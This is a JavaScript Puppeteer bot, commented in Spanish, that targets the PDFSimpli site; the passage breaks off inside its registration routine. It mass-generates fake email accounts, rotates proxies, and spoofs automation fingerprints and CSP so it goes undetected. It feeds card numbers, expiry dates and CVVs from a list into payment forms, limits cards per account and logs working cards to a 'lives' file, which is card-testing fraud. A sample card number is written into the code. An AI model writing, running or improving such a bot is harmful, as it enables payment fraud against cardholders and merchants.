const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// ============================================================
// CONFIGURACIÓN CHROMIUM PARA UBUNTU - RUTA CORREGIDA
// ============================================================
class ChromiumVNCConfig {
    constructor() {
        // RUTA CORREGIDA PARA UBUNTU 20.04
        this.CHROMIUM_PATH = "/bin/chromium-browser";
        this.DISPLAY = ":1";
        this.browser = null;
        this.page = null;
    }

    verificarChromium() {
        console.log('🔍 Verificando instalación de Chromium...');
        
        if (!fs.existsSync(this.CHROMIUM_PATH)) {
            console.error("❌ ERROR: Chromium no existe en la ruta: " + this.CHROMIUM_PATH);
            console.error("👉 Ejecuta: sudo apt install chromium-browser -y");
            return false;
        } else {
            console.log("✅ Chromium encontrado en:", this.CHROMIUM_PATH);
            return true;
        }
    }

    async iniciarVNC() {
        return new Promise((resolve) => {
            console.log("🖥️  Verificando servidor VNC...");
            // PARA UBUNTU - usar tightvncserver
            exec("pgrep Xvnc || vncserver :1 -geometry 1280x720 -depth 24", (error, stdout, stderr) => {
                if (error) {
                    console.log("❌ Error iniciando VNC:", error);
                    console.log("👉 Instala VNC: sudo apt install tightvncserver -y");
                    console.log("👉 Luego ejecuta: vncserver :1");
                } else {
                    console.log("✅ Servidor VNC listo en :1");
                }
                resolve();
            });
        });
    }

    getOpcionesNavegador() {
        process.env.DISPLAY = this.DISPLAY;

        const options = {
            headless: false,
            executablePath: this.CHROMIUM_PATH,
            ignoreHTTPSErrors: true,
            defaultViewport: null,
            args: [
                `--display=${this.DISPLAY}`,
                "--start-maximized",
                "--window-size=1280,720",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--disable-features=VizDisplayCompositor",
                "--ignore-certificate-errors",
                "--allow-insecure-localhost",
                "--disable-web-security",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=TranslateUI",
                "--disable-ipc-flooding-protection",
                "--disable-renderer-backgrounding",
                "--disable-background-timer-throttling",
                "--disable-backgrounding-occluded-windows",
                "--disable-field-trial-config",
                "--disable-composited-antialiasing"
            ]
        };

        return options;
    }

    async iniciarNavegador() {
        try {
            if (!this.verificarChromium()) {
                throw new Error('Chromium no está instalado');
            }

            await this.iniciarVNC();

            console.log('🚀 Iniciando navegador en VNC...');
            
            const options = this.getOpcionesNavegador();
            this.browser = await puppeteer.launch(options);
            this.page = await this.browser.newPage();
            
            await this.configurarPagina();
            
            console.log('✅ Navegador configurado en VNC', 'SUCCESS');
            return { browser: this.browser, page: this.page };
            
        } catch (error) {
            console.error('❌ Error iniciando navegador:', error);
            throw error;
        }
    }

    async configurarPagina() {
        await this.page.setDefaultNavigationTimeout(30000);
        await this.page.setDefaultTimeout(15000);
        
        await this.page.setUserAgent('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            
            const originalQuery = window.chrome.runtime.sendMessage;
            window.chrome.runtime.sendMessage = (...args) => {
                if (args[0] && args[0].message && args[0].message.type === 'getInstalledRelatedApps') {
                    return Promise.resolve([]);
                }
                return originalQuery.apply(this, args);
            };
        });

        await this.page.setBypassCSP(true);
    }

    async navegarA(url, opciones = {}) {
        const defaultOpciones = {
            waitUntil: 'networkidle2',
            timeout: 30000
        };
        
        return await this.page.goto(url, { ...defaultOpciones, ...opciones });
    }

    async capturarPantalla(nombreArchivo = 'screenshot.png') {
        // RUTA PARA UBUNTU - Directorio Downloads del usuario
        const rutaDescargas = path.join(process.env.HOME, 'Downloads', nombreArchivo);
        await this.page.screenshot({ path: rutaDescargas, fullPage: true });
        console.log(`📸 Captura guardada: ${rutaDescargas}`);
    }

    async cerrarNavegador() {
        if (this.browser) {
            await this.browser.close();
            console.log('🔴 Navegador cerrado');
        }
    }

    async diagnosticoCompleto() {
        console.log('\n🔍 EJECUTANDO DIAGNÓSTICO COMPLETO...');
        
        const chromiumOk = this.verificarChromium();
        
        console.log('🖥️  Verificando estado VNC...');
        try {
            await new Promise((resolve, reject) => {
                exec("pgrep Xvnc", (error, stdout) => {
                    if (error && !stdout) {
                        console.log('❌ VNC no está corriendo');
                        resolve(false);
                    } else {
                        console.log('✅ VNC está activo');
                        resolve(true);
                    }
                });
            });
        } catch (e) {
            console.log('⚠️  No se pudo verificar VNC:', e.message);
        }
        
        console.log('📁 Verificando permisos de archivos...');
        try {
            const rutaDescargas = path.join(process.env.HOME, 'Downloads');
            fs.accessSync(rutaDescargas, fs.constants.W_OK);
            console.log('✅ Permisos de escritura en Downloads OK');
        } catch {
            console.log('❌ Sin permisos en Downloads');
        }
        
        return chromiumOk;
    }
}

// ============================================================
// CLASE PAGOAUTO MEJORADA (SIN CAMBIOS)
// ============================================================
class PagoAuto {
    constructor(page) {
        this.page = page;
    }

    delay(ms) {
        return new Promise(res => setTimeout(res, ms));
    }

    async getFrames() {
        return this.page.frames();
    }

    async findXPath(frame, xpath) {
        const handles = await frame.$x(xpath);
        return handles.length ? handles[0] : null;
    }

    async buscarYCompletarTarjeta(tarjeta) {
        try {
            const frames = await this.getFrames();

            if (frames.length > 1) {
                const frame = frames[1];
                const selects = [
                    "#data",
                    "input[name='cardNumber']",
                    "input[placeholder*='card']",
                    "input[placeholder*='number']"
                ];

                for (const sel of selects) {
                    try {
                        const campo = await frame.waitForSelector(sel, { timeout: 1000 });
                        const maxlength = await frame.evaluate(el => el.getAttribute("maxlength"), campo);

                        if (maxlength && parseInt(maxlength) >= 16) {
                            await campo.click({ clickCount: 3 });
                            await campo.type(tarjeta.numero, { delay: 40 });
                            return true;
                        }
                    } catch {}
                }
            }

            return await this.buscarYCompletarTarjetaFallback(tarjeta);

        } catch {
            return await this.buscarYCompletarTarjetaFallback(tarjeta);
        }
    }

    async buscarYCompletarTarjetaFallback(tarjeta) {
        const frames = await this.getFrames();

        for (const frame of frames) {
            const selects = [
                "#data",
                "input[name='cardNumber']",
                "input[placeholder*='card']",
                "input[maxlength='16']",
                "input[maxlength='19']"
            ];

            for (const sel of selects) {
                try {
                    const campo = await frame.waitForSelector(sel, { timeout: 500 });
                    const maxlength = await frame.evaluate(el => el.getAttribute("maxlength"), campo);

                    if (maxlength && parseInt(maxlength) >= 16) {
                        await campo.click({ clickCount: 3 });
                        await campo.type(tarjeta.numero, { delay: 40 });
                        return true;
                    }
                } catch {}
            }
        }

        return false;
    }

    async buscarYCompletarNombre(nombre) {
        const selects = [
            "#checkout_form_card_name",
            "input[name='cardName']",
            "input[placeholder*='name']",
            "input[placeholder*='nombre']",
            "input[name*='holder']"
        ];

        for (const sel of selects) {
            try {
                const campo = await this.page.waitForSelector(sel, { timeout: 1200 });
                await campo.click({ clickCount: 3 });
                await campo.type(nombre, { delay: 35 });
                return true;
            } catch {}
        }

        return false;
    }

    async buscarYCompletarCVV(cvv) {
        try {
            const frames = await this.getFrames();

            if (frames.length > 6) {
                const frame = frames[6];
                const xpath = "//input[@maxlength='4' and (@id='data' or @name='Data')]";
                const campo = await this.findXPath(frame, xpath);
                
                if (campo) {
                    await campo.click({ clickCount: 3 });
                    await campo.type(cvv, { delay: 40 });
                    return true;
                }
            }

            return await this.buscarYCompletarCVVFallback(cvv);

        } catch {
            return await this.buscarYCompletarCVVFallback(cvv);
        }
    }

    async buscarYCompletarCVVFallback(cvv) {
        const frames = await this.getFrames();

        for (const frame of frames) {
            const selects = [
                "input[maxlength='3']",
                "input[maxlength='4']",
                "input[placeholder*='cvv']",
                "input[placeholder*='security']"
            ];

            for (const sel of selects) {
                try {
                    const campo = await frame.waitForSelector(sel, { timeout: 500 });
                    await campo.click({ clickCount: 3 });
                    await campo.type(cvv, { delay: 40 });
                    return true;
                } catch {}
            }
        }

        return false;
    }

    async buscarYCompletarFecha(tarjeta) {
        let completo = 0;

        const mesValue = String(parseInt(tarjeta.mes)); 
        this.log(`📌 MES REAL: ${mesValue}`);

        let anioValue = tarjeta.anio;
        if (anioValue.length === 2) anioValue = "20" + anioValue;
        this.log(`📌 AÑO REAL: ${anioValue}`);

        const selectoresMes = ["#expmo", "select[name='ccMonthExp']"];
        const selectoresAnio = ["#expyr", "select[name='ccYearExp']"];

        const seleccionarPorTextoVisible = async (selectorList, texto) => {
            for (let selector of selectorList) {
                try {
                    await this.page.waitForSelector(selector, { timeout: 800 });

                    const ok = await this.page.evaluate((sel, txt) => {
                        const el = document.querySelector(sel);
                        if (!el) return false;

                        if (el.offsetParent === null) return false;

                        const opts = [...el.options];
                        const opcion = opts.find(o => o.text.trim() === txt.trim());
                        if (!opcion) return false;

                        el.value = opcion.value;
                        el.dispatchEvent(new Event("input", { bubbles: true }));
                        el.dispatchEvent(new Event("change", { bubbles: true }));
                        return true;
                    }, selector, texto);

                    if (ok) {
                        this.log(`✅ Seleccionado en: ${selector} → "${texto}"`);
                        return true;
                    }

                } catch (e) {}
            }
            return false;
        };

        const mesTexto = tarjeta.mes.toString().padStart(2, "0");
        if (await seleccionarPorTextoVisible(selectoresMes, mesTexto)) {
            completo++;
        } else {
            this.log("❌ MES no seleccionado", "ERROR");
        }

        if (await seleccionarPorTextoVisible(selectoresAnio, anioValue)) {
            completo++;
        } else {
            this.log("❌ AÑO no seleccionado", "ERROR");
        }

        this.log(`📊 Resultado final: ${completo}/2`);
        return completo >= 2;
    }

    async marcarTerminos() {
        this.log("🟦 Marcando Términos y Condiciones...");

        const selectorVisible = "#acceptCheckboxMark";
        const posiblesReales = [
            "input[type='checkbox'][name*='term']",
            "input[type='checkbox'][id*='term']", 
            "input[type='checkbox'][name*='accept']",
            "input[type='checkbox'][id*='accept']",
            "#acceptCheckbox",
            "input[type='checkbox']"
        ];

        try {
            await this.page.waitForSelector(selectorVisible, { timeout: 1500 });
            await this.page.click(selectorVisible, { delay: 50 });
            this.log("📌 Clic en checkbox visible realizado");

            const resultado = await this.page.evaluate((posibles) => {
                let marcadoAlguno = false;
                for (let sel of posibles) {
                    const real = document.querySelector(sel);
                    if (real) {
                        real.checked = true;
                        real.setAttribute("checked", "true");
                        real.dispatchEvent(new Event("input", { bubbles: true }));
                        real.dispatchEvent(new Event("change", { bubbles: true }));
                        real.dispatchEvent(new Event("click", { bubbles: true }));
                        marcadoAlguno = true;
                    }
                }
                return marcadoAlguno;
            }, posiblesReales);

            if (resultado) {
                this.log("✅ Inputs reales marcados programáticamente");
            } else {
                this.log("⚠️ No se encontraron inputs reales para marcar");
            }

            await this.delay(400);

            const mensajeError = await this.page.evaluate(() => {
                const texto = document.body.innerText.toLowerCase();
                return texto.includes("acept") || texto.includes("términ") || texto.includes("terms");
            });

            if (!mensajeError) {
                this.log("✅ VALIDACIÓN REAL EXITOSA - Términos aceptados por el sistema");
                return true;
            }

            this.log("⚠️ El sistema aún detecta que faltan los términos", "WARNING");
            return true;

        } catch (e) {
            this.log(`❌ Error en marcado de términos: ${e.message}`, "ERROR");
            this.log("⚠️ Continuando flujo a pesar del error...");
            return false;
        }
    }

    async limpiarCamposParaNuevaTarjeta() {
        try {
            this.log('🧹 Limpiando campos para nueva tarjeta...');

            const selectoresNombre = [
                "#checkout_form_card_name",
                "input[name='cardName']",
                "input[placeholder*='name']",
                "input[placeholder*='nombre']",
                "input[name*='holder']"
            ];

            for (const sel of selectoresNombre) {
                try {
                    const campo = await this.page.$(sel);
                    if (campo) {
                        await campo.click({ clickCount: 3 });
                        await campo.press('Backspace');
                        this.log('✅ Campo de nombre limpiado');
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }

            const frames = await this.page.frames();
            for (const frame of frames) {
                const selectoresTarjeta = [
                    "#data",
                    "input[name='cardNumber']",
                    "input[placeholder*='card']",
                    "input[placeholder*='number']"
                ];

                for (const sel of selectoresTarjeta) {
                    try {
                        const campo = await frame.$(sel);
                        if (campo) {
                            await campo.click({ clickCount: 3 });
                            await campo.press('Backspace');
                            this.log('✅ Campo de tarjeta limpiado');
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            }

            for (const frame of frames) {
                const selectoresCVV = [
                    "input[maxlength='3']",
                    "input[maxlength='4']",
                    "input[placeholder*='cvv']",
                    "input[placeholder*='security']"
                ];

                for (const sel of selectoresCVV) {
                    try {
                        const campo = await frame.$(sel);
                        if (campo) {
                            await campo.click({ clickCount: 3 });
                            await campo.press('Backspace');
                            this.log('✅ Campo de CVV limpiado');
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
            }

            this.log('✅ Todos los campos limpiados (nombre, tarjeta, CVV) - Fecha y año se mantienen');
            return true;

        } catch (error) {
            this.log(`❌ Error limpiando campos: ${error.message}`, 'ERROR');
            return false;
        }
    }

    async clickContinuar() {
        await this.delay(1500);

        const selects = [
            "button[type='submit']",
            "button#continue",
            "button#next",
            "button#confirm",
            "#planPageContinueButton",
            'input[type="submit"]',
            'input[value="Continue"]',
            'input[value="Pagar"]',
            'button:contains("Continue")',
            'button:contains("Continuar")',
            'button:contains("Pagar")',
            'button:contains("Pay")'
        ];

        for (const sel of selects) {
            try {
                let btn;
                if (sel.includes('contains')) {
                    const buttons = await this.page.$$('button');
                    for (const button of buttons) {
                        const text = await this.page.evaluate(el => el.textContent, button);
                        if (text && text.toLowerCase().includes(sel.toLowerCase().replace('button:contains("', '').replace('")', ''))) {
                            btn = button;
                            break;
                        }
                    }
                } else {
                    btn = await this.page.$(sel);
                }

                if (!btn) continue;

                const box = await btn.boundingBox();
                if (!box) continue;

                await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
                await this.delay(100);
                await this.page.mouse.down();
                await this.delay(60);
                await this.page.mouse.up();

                await this.delay(3000);
                return true;

            } catch {}
        }

        return false;
    }

    log(mensaje, tipo = 'INFO') {
        const timestamp = new Date().toLocaleTimeString();
        const logLine = `[${timestamp}] [PagoAuto] ${mensaje}`;
        
        if (tipo === 'ERROR') {
            console.log(`\x1b[91m${logLine}\x1b[0m`);
        } else if (tipo === 'WARNING') {
            console.log(`\x1b[93m${logLine}\x1b[0m`);
        } else {
            console.log(logLine);
        }
    }
}

// ============================================================
// CLASE PRINCIPAL DEL BOT - RUTAS ADAPTADAS PARA UBUNTU
// ============================================================
class BotPDFSimpli {
    constructor() {
        this.vncConfig = new ChromiumVNCConfig();
        
        // RUTAS PARA UBUNTU 20.04 - Directorio Downloads del usuario
        this.rutaPdf = path.join(process.env.HOME, 'Downloads');
        this.archivoTarjetas = path.join(process.env.HOME, 'Downloads', 'tarjetas.txt');
        this.archivoLives = path.join(process.env.HOME, 'Downloads', 'lives.txt');
        this.archivoCuentas = path.join(process.env.HOME, 'Downloads', 'cuentas_pdfsimpli.json');
        this.archivoProxies = path.join(process.env.HOME, 'Downloads', 'proxies.txt');
        this.archivoLog = path.join(process.env.HOME, 'Downloads', 'bot_log.txt');
        
        this.browser = null;
        this.page = null;
        this.cuentas = [];
        this.cuentaActual = null;
        this.proxies = [];
        this.proxyActual = null;
        
        this.maxTarjetasPorCuenta = 3;
        this.maxReintentosClic = 20;
        this.tiempoEsperaEntreReintentos = 1000;
        
        this.pagoAuto = null;
        
        this.estadisticas = {
            tarjetasProcesadas: 0,
            tarjetasValidas: 0,
            cuentasUsadas: 0,
            errores: 0,
            recaptchasResueltos: 0,
            recaptchasManuales: 0,
            reintentosClic: 0,
            tiempoEsperaAcumulado: 0
        };

        this.cargarProxies();
        this.cargarOGenerarCuentas();
        this.crearArchivosNecesarios();
        this.inicializarLog();
    }

    delayHumano(msMin = 1800, msMax = 3500) {
        const ms = msMin + Math.random() * (msMax - msMin);
        return new Promise(r => setTimeout(r, ms));
    }

    inicializarLog() {
        const timestamp = new Date().toISOString();
        const logHeader = `\n\n=== INICIO DE SESIÓN - ${timestamp} ===\n`;
        fs.appendFileSync(this.archivoLog, logHeader, 'utf8');
    }

    async log(mensaje, tipo = 'INFO') {
        const timestamp = new Date().toLocaleTimeString();
        const logLine = `[${timestamp}] [${tipo}] ${mensaje}\n`;
        
        if (tipo === 'ERROR') {
            console.log(`\x1b[91m${mensaje}\x1b[0m`);
        } else if (tipo === 'SUCCESS') {
            console.log(`\x1b[92m${mensaje}\x1b[0m`);
        } else if (tipo === 'WARNING') {
            console.log(`\x1b[93m${mensaje}\x1b[0m`);
        } else {
            console.log(mensaje);
        }
        
        fs.appendFileSync(this.archivoLog, logLine, 'utf8');
    }

    async logError(error, contexto) {
        await this.log(`💥 ERROR en ${contexto}: ${error.message}`, 'ERROR');
        if (this.page) {
            try {
                const url = await this.page.url();
                await this.log(`📍 URL actual: ${url}`, 'ERROR');
            } catch (e) {}
        }
    }

    crearArchivosNecesarios() {
        try {
            // Crear directorio Downloads si no existe
            const downloadsDir = path.join(process.env.HOME, 'Downloads');
            if (!fs.existsSync(downloadsDir)) {
                fs.mkdirSync(downloadsDir, { recursive: true });
            }

            if (!fs.existsSync(this.archivoTarjetas)) {
                fs.writeFileSync(this.archivoTarjetas, "# Formato: numero|mes|año|cvv\n5124013001057531|03|2030|275\n", 'utf8');
                this.log('📁 Archivo de tarjetas creado en Downloads');
            }
            
            if (!fs.existsSync(this.archivoLives)) {
                fs.writeFileSync(this.archivoLives, "# Tarjetas válidas encontradas\n", 'utf8');
            }
            
            if (!fs.existsSync(this.archivoProxies)) {
                fs.writeFileSync(this.archivoProxies, "# Formato: ip:puerto\n", 'utf8');
            }
        } catch (error) {
            this.log('❌ Error creando archivos necesarios', 'ERROR');
        }
    }

    async delay(ms) {
        this.estadisticas.tiempoEsperaAcumulado += ms;
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async ejecutarConReintentos(accion, descripcion, maxReintentos = 3, delayEntreReintentos = 3000) {
        for (let intento = 1; intento <= maxReintentos; intento++) {
            try {
                this.log(`🔄 Ejecutando ${descripcion} [Intento ${intento}/${maxReintentos}]`);
                const resultado = await accion();
                
                if (resultado === true) {
                    this.log(`✅ ${descripcion} exitoso`, 'SUCCESS');
                    return true;
                }
                
                if (resultado === false && intento < maxReintentos) {
                    this.log(`⚠️ ${descripcion} falló, reintentando...`, 'WARNING');
                    await this.delay(delayEntreReintentos);
                    continue;
                }
                
                return resultado;
                
            } catch (error) {
                this.logError(error, `${descripcion} - intento ${intento}`);
                
                if (intento < maxReintentos) {
                    await this.delay(delayEntreReintentos);
                }
            }
        }
        
        this.log(`❌ ${descripcion} falló después de ${maxReintentos} intentos`, 'ERROR');
        return false;
    }

    cargarProxies() {
        try {
            if (fs.existsSync(this.archivoProxies)) {
                const data = fs.readFileSync(this.archivoProxies, 'utf8');
                const lineas = data.split('\n');
                for (const linea of lineas) {
                    const lineaClean = linea.trim();
                    if (lineaClean && !lineaClean.startsWith('#')) {
                        this.proxies.push(lineaClean);
                    }
                }
                this.log(`✅ ${this.proxies.length} proxies cargados`);
            }
        } catch (error) {
            this.log('⚠️ No se pudieron cargar proxies');
        }
    }

    cargarOGenerarCuentas() {
        try {
            if (fs.existsSync(this.archivoCuentas)) {
                const data = JSON.parse(fs.readFileSync(this.archivoCuentas, 'utf8'));
                this.cuentas = data.get('cuentas', []);
                this.log(`✅ ${this.cuentas.length} cuentas cargadas`);

                this.cuentas.forEach(c => {
                    if (c.tarjetasProcesadas === undefined) c.tarjetasProcesadas = 0;
                    if (c.validada === undefined) c.validada = false;
                    if (c.ultimoUso === undefined) c.ultimoUso = null;
                    if (c.exitosas === undefined) c.exitosas = 0;
                    if (c.fallidas === undefined) c.fallidas = 0;
                    if (c.bloqueadaHasta === undefined) c.bloqueadaHasta = null;
                    if (c.registroFallido === undefined) c.registroFallido = false;
                });
            } else {
                this.generarListaCuentas();
                this.guardarCuentas();
                this.log(`🆕 ${this.cuentas.length} cuentas generadas`);
            }
        } catch (e) {
            this.generarListaCuentas();
            this.guardarCuentas();
        }
    }

    generarListaCuentas() {
        const nombres = ['juan','maria','carlos','ana','luis','laura','pedro','sofia','roberto','andrea'];
        const apellidos = ['garcia','rodriguez','gonzalez','fernandez','lopez','martinez','ramirez','perez'];

        const formatos = [
            (n, a, num) => `${n}.${a}${num}`,
            (n, a, num) => `${n}${a}${num}`,
            (n, a, num) => `${n}_${a}${num}`,
            (n, a, num) => `${n}${num}`,
            (n, a, num) => `${n[0]}${a}${num}`,
            (n, a, num) => `${n}${a[0]}${num}`
        ];

        const dominios = ['gmail.com','outlook.com','hotmail.com','yahoo.com'];

        this.cuentas = [];
        const usados = new Set();

        for (let i = 0; i < 50; i++) {
            let email, n, a, num;

            do {
                n = nombres[Math.floor(Math.random() * nombres.length)];
                a = apellidos[Math.floor(Math.random() * apellidos.length)];

                num = Math.random() < 0.5
                    ? Math.floor(Math.random() * 900 + 100)
                    : Math.floor(Math.random() * 9000 + 1000);

                const formato = formatos[Math.floor(Math.random() * formatos.length)];
                const dominio = dominios[Math.floor(Math.random() * dominios.length)];

                email = `${formato(n, a, num)}@${dominio}`;
            } while (usados.has(email));

            usados.add(email);

            const password =
                `${n.charAt(0).toUpperCase() + n.slice(1).toLowerCase()}` + 
                `${a.charAt(0).toUpperCase() + a.slice(1).toLowerCase()}` +
                `${Math.floor(Math.random() * 900 + 100)}!`;

            this.cuentas.push({
                email,
                password,
                tarjetasProcesadas: 0,
                fechaCreacion: new Date().toISOString(),
                ultimoUso: null,
                exitosas: 0,
                fallidas: 0,
                validada: false,
                bloqueadaHasta: null,
                registroFallido: false
            });
        }
    }

    guardarCuentas() {
        try {
            const data = {
                cuentas: this.cuentas,
                ultimaActualizacion: new Date().toISOString(),
                totalCuentas: this.cuentas.length
            };
            fs.writeFileSync(this.archivoCuentas, JSON.stringify(data, null, 2));
        } catch (error) {
            this.log('❌ Error guardando cuentas', 'ERROR');
        }
    }

    obtenerProximaCuenta() {
        const ahora = Date.now();

        this.cuentas.forEach(c => {
            if (c.registroFallido && c.ultimoUso) {
                const tiempoTranscurrido = ahora - new Date(c.ultimoUso).getTime();
                if (tiempoTranscurrido >= 3600000) {
                    c.registroFallido = false;
                    this.log(`🔄 Reactivando cuenta después de 1 hora: ${c.email}`, 'INFO');
                }
            }
        });

        const cuentasDisponibles = this.cuentas.filter(c => {
            if (c.validada) return false;
            if (c.registroFallido) return false;

            if (c.tarjetasProcesadas >= 3 && c.bloqueadaHasta) {
                if (new Date(c.bloqueadaHasta).getTime() > ahora) return false;
                c.tarjetasProcesadas = 0;
                c.fallidas = 0;
                c.bloqueadaHasta = null;
                this.log(`🔄 Bloqueo expirado - reactivando cuenta: ${c.email}`, 'INFO');
            }

            return true;
        });

        if (cuentasDisponibles.length === 0) {
            this.log('❌ No hay cuentas disponibles después del filtrado', 'WARNING');
            return null;
        }

        return cuentasDisponibles.sort((a, b) => {
            if (a.tarjetasProcesadas !== b.tarjetasProcesadas) {
                return a.tarjetasProcesadas - b.tarjetasProcesadas;
            }
            
            if (a.ultimoUso && b.ultimoUso) {
                return new Date(a.ultimoUso).getTime() - new Date(b.ultimoUso).getTime();
            }
            
            return new Date(a.fechaCreacion).getTime() - new Date(b.fechaCreacion).getTime();
        })[0];
    }

    async iniciarNavegador() {
        return await this.ejecutarConReintentos(async () => {
            this.log('🚀 Iniciando navegador en VNC...');
            
            const { browser, page } = await this.vncConfig.iniciarNavegador();
            this.browser = browser;
            this.page = page;

            this.pagoAuto = new PagoAuto(this.page);

            this.log('✅ Navegador configurado en VNC', 'SUCCESS');
            return true;
        }, 'iniciar navegador', 2, 3000);
    }

    async clicInteligente(selectores, descripcion, tiempoEspera = 3000) {
        this.log(`🎯 Buscando: ${descripcion}`);
        
        for (let intento = 1; intento <= this.maxReintentosClic; intento++) {
            try {
                this.log(`🔄 [Intento ${intento}/${this.maxReintentosClic}] Buscando: ${descripcion}`);
                
                for (const selector of selectores) {
                    try {
                        let elemento = null;
                        
                        if (selector.tipo === 'id') {
                            elemento = await this.page.$(selector.valor);
                        } else if (selector.tipo === 'texto') {
                            const elementos = await this.page.$$(selector.elemento || 'button, a, input[type="submit"], span, div');
                            for (const elem of elementos) {
                                try {
                                    const texto = await this.page.evaluate(el => el.textContent, elem);
                                    if (texto && texto.toLowerCase().includes(selector.valor.toLowerCase())) {
                                        elemento = elem;
                                        break;
                                    }
                                } catch (e) {
                                    continue;
                                }
                            }
                        }

                        if (elemento) {
                            this.log(`✅ Elemento encontrado: ${selector.tipo} - ${selector.valor}`, 'SUCCESS');
                            
                            await elemento.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                            await this.delay(1000);
                            
                            try {
                                await elemento.click();
                            } catch (error) {
                                await this.page.evaluate((el) => {
                                    el.click();
                                }, elemento);
                            }
                            
                            this.log(`🎉 Clic exitoso en: ${descripcion}`, 'SUCCESS');
                            await this.delay(tiempoEspera);
                            return true;
                        }
                    } catch (error) {
                        continue;
                    }
                }
                
                await this.delay(this.tiempoEsperaEntreReintentos);
                this.estadisticas.reintentosClic++;
                
            } catch (error) {
                this.logError(error, `intento ${intento} para ${descripcion}`);
                await this.delay(this.tiempoEsperaEntreReintentos);
            }
        }
        
        this.log(`❌ No se pudo hacer clic en: ${descripcion} después de ${this.maxReintentosClic} intentos`, 'ERROR');
        return false;
    }

    async clicInteligenteConTimeout(selectores, descripcion, timeout = 5000) {
        const startTime = Date.now();
        
        while (Date.now() - startTime < timeout) {
            for (const selector of selectores) {
                try {
                    let elemento = null;
                    
                    if (selector.tipo === 'id') {
                        elemento = await this.page.$(selector.valor);
                    } else if (selector.tipo === 'texto') {
                        const elementos = await this.page.$$(selector.elemento || 'button, a, input[type="submit"], span, div');
                        for (const elem of elementos) {
                            try {
                                const texto = await this.page.evaluate(el => el.textContent, elem);
                                if (texto && texto.toLowerCase().includes(selector.valor.toLowerCase())) {
                                    elemento = elem;
                                    break;
                                }
                            } catch (e) {
                                continue;
                            }
                        }
                    }

                    if (elemento) {
                        const isVisible = await elemento.evaluate(el =>
                            el.offsetParent !== null && 
                            !el.disabled && 
                            getComputedStyle(el).visibility !== 'hidden'
                        );
                        
                        if (isVisible) {
                            await elemento.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                            await this.delay(500);
                            
                            try {
                                await elemento.click();
                                this.log(`✅ Clic exitoso en: ${descripcion}`, 'SUCCESS');
                                return true;
                            } catch (error) {
                                await this.page.evaluate(el => el.click(), elemento);
                                this.log(`✅ Clic exitoso (fallback) en: ${descripcion}`, 'SUCCESS');
                                return true;
                            }
                        }
                    }
                } catch (error) {
                    continue;
                }
            }
            
            await this.delay(500);
        }
        
        this.log(`❌ Timeout - No se pudo hacer clic en: ${descripcion} después de ${timeout}ms`, 'ERROR');
        return false;
    }

    // ============================================================
    // FLUJO CORREGIDO - PRIMERO SUBIR PDF, LUEGO REGISTRO
    // ============================================================

    async subirPDF() {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('📁 Buscando PDF...');
                
                const archivos = fs.readdirSync(this.rutaPdf);
                const pdfs = archivos.filter(f => f.toLowerCase().endsWith('.pdf'));
                
                if (pdfs.length === 0) {
                    this.log('❌ No hay PDFs en la carpeta', 'ERROR');
                    return false;
                }

                const pdfPath = path.join(this.rutaPdf, pdfs[0]);
                this.log(`🎯 PDF seleccionado: ${pdfs[0]}`);

                await this.delay(2000);

                // Buscar input de archivo de manera más agresiva
                let inputFile = await this.page.$('input[type="file"]');
                
                if (!inputFile) {
                    this.log('🔍 Búsqueda exhaustiva de input file...');
                    const inputs = await this.page.$$('input');
                    for (const input of inputs) {
                        const type = await input.evaluate(el => el.getAttribute('type'));
                        if (type === 'file') {
                            inputFile = input;
                            break;
                        }
                    }
                }

                if (!inputFile) {
                    this.log('❌ No se encontró input file', 'ERROR');
                    return false;
                }

                await inputFile.uploadFile(pdfPath);
                this.log('✅ PDF subido', 'SUCCESS');
                
                // Esperar a que procese el PDF
                await this.delay(5000);
                return true;

            } catch (error) {
                this.logError(error, 'subirPDF');
                return false;
            }
        }, 'subir PDF', 3, 3000);
    }

    async hacerClicConvert() {
        const selectores = [
            { tipo: 'id', valor: '#ConvertContinue' },
            { tipo: 'texto', valor: 'convert', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'continue', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'convertir', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'process', elemento: 'button, input, div' },
            { tipo: 'texto', valor: 'procesar', elemento: 'button, input, div' }
        ];
        
        return await this.clicInteligente(selectores, 'CONVERTIR PDF', 5000);
    }

    async hacerClicDownload() {
        const selectores = [
            { tipo: 'id', valor: '#congDwnaut' },
            { tipo: 'texto', valor: 'download', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'get file', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'descargar', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'download now', elemento: 'button, a, div, input' },
            { tipo: 'texto', valor: 'descargar ahora', elemento: 'button, a, div, input' }
        ];
        
        return await this.clicInteligente(selectores, 'DESCARGAR', 5000);
    }

    // ============================================================
    // MANEJAR REGISTRO - SOLO DESPUÉS DE SUBIR PDF Y CLIC DOWNLOAD
    // ============================================================

    async manejarRegistro() {
        return await this.ejecutarConReintentos(async () => {
            try {
                this.log('👤 Iniciando proceso de registro...');
                await this.delayHumano();

                if (!this.cuentaActual) {
                    this.cuentaActual = this.obtenerProximaCuenta();
                    if (!this.cuentaActual) {
                        this.log('❌ No se pudo obtener una cuenta válida', 'ERROR');
                        return false;
                    }
                }

                this.log(`🔄 Cuenta asignada: ${this.cuentaActual.email}`);

                // Esperar a que cargue la página de registro
                await this.delay(3000);

